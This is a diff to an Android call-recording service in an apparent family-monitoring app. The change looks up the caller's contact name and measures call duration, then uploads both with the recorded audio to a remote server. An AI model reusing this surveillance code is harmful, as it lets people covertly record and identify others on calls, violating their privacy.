@@ -23,6 +23,9 @@ import com.familyguardpro.utils.PreferenceManager
 import kotlinx.coroutines.*
 import org.java_websocket.client.WebSocketClient
 import org.java_websocket.handshake.ServerHandshake
+import android.database.Cursor
+import android.net.Uri
+import android.provider.ContactsContract
 import java.io.File
 import java.net.URI
 import java.text.SimpleDateFormat
@@ -56,6 +59,7 @@ class CallRecordService : Service() {
     private var telephonyManager: TelephonyManager? = null
     private var currentPhoneNumber: String? = null
     private var currentCallType: String = "unknown"
+    private var recordingStartTime: Long = 0L
 
     override fun onCreate() {
         super.onCreate()
@@ -236,6 +240,7 @@ class CallRecordService : Service() {
     private fun startCallRecording() {
         if (isRecording) return
         isRecording = true
+        recordingStartTime = System.currentTimeMillis()
         
         Log.d(TAG, "Starting call recording for: $currentPhoneNumber")
         
@@ -251,9 +256,18 @@ class CallRecordService : Service() {
         if (!isRecording) return
         isRecording = false
         
-        Log.d(TAG, "Stopping call recording")
+        // Calculate actual duration in seconds
+        val durationSeconds = if (recordingStartTime > 0L) {
+            ((System.currentTimeMillis() - recordingStartTime) / 1000).toInt()
+        } else 0
+        
+        Log.d(TAG, "Stopping call recording, duration=${durationSeconds}s")
         
         audioRecorder?.stopRecording()
+        
+        // Resolve contact name from phone number
+        val contactName = getContactName(currentPhoneNumber)
+        Log.d(TAG, "Resolved contact name: $contactName for number: $currentPhoneNumber")
         
         // Upload recording and schedule deletion
         currentRecordingFile?.let { file ->
@@ -267,19 +281,39 @@ class CallRecordService : Service() {
                 file.delete() // Delete temp file
                 
                 // Upload and schedule auto-delete
-                uploadCallRecordingWithAutoDelete(permanentFile, currentPhoneNumber)
+                uploadCallRecordingWithAutoDelete(permanentFile, currentPhoneNumber, contactName, durationSeconds)
             }
         }
     }
 
-    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?) {
+    private fun getContactName(phoneNumber: String?): String? {
+        if (phoneNumber.isNullOrEmpty()) return null
+        try {
+            val uri = Uri.withAppendedPath(
+                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
+                Uri.encode(phoneNumber)
+            )
+            val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
+            val cursor: Cursor? = contentResolver.query(uri, projection, null, null, null)
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    return it.getString(it.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME))
+                }
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Could not resolve contact name for $phoneNumber: ${e.message}")
+        }
+        return null
+    }
+
+    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int) {
         serviceScope.launch {
             var uploadSuccess = false
             var retryCount = 0
             val maxRetries = 3
             
             while (!uploadSuccess && retryCount < maxRetries) {
-                uploadSuccess = uploadCallRecording(file, phoneNumber)
+                uploadSuccess = uploadCallRecording(file, phoneNumber, contactName, durationSeconds)
                 if (!uploadSuccess) {
                     retryCount++
                     Log.w(TAG, "Upload failed, retry $retryCount/$maxRetries")
@@ -304,16 +338,15 @@ class CallRecordService : Service() {
         }
     }
 
-    private suspend fun uploadCallRecording(file: File, phoneNumber: String?): Boolean {
+    private suspend fun uploadCallRecording(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int): Boolean {
         return try {
             val deviceId = preferenceManager.getDeviceId()
             val baseUrl = ApiClient.BASE_URL.trimEnd('/')
             val uploadUrl = "$baseUrl/api/sync/call-recording"
             
-            Log.i(TAG, "Uploading call recording: ${file.name}, size=${file.length()}, deviceId=$deviceId")
+            Log.i(TAG, "Uploading call recording: ${file.name}, size=${file.length()}, duration=${durationSeconds}s, contact=$contactName, deviceId=$deviceId")
             
-            // Calculate duration from file (approximate: file size / bitrate)
-            val duration = (file.length() / 8000).toInt() // rough estimate for MP3
+            val duration = durationSeconds
             
             // Create multipart request
             val boundary = "----FormBoundary${System.currentTimeMillis()}"
@@ -350,6 +383,11 @@ class CallRecordService : Service() {
             writer.append("\r\n--$boundary\r\n")
             writer.append("Content-Disposition: form-data; name=\"phoneNumber\"\r\n\r\n")
             writer.append(phoneNumber ?: "Unknown")
+            
+            // Add contactName field
+            writer.append("\r\n--$boundary\r\n")
+            writer.append("Content-Disposition: form-data; name=\"contactName\"\r\n\r\n")
+            writer.append(contactName ?: "")
             
             // Add callType field
             writer.append("\r\n--$boundary\r\n")
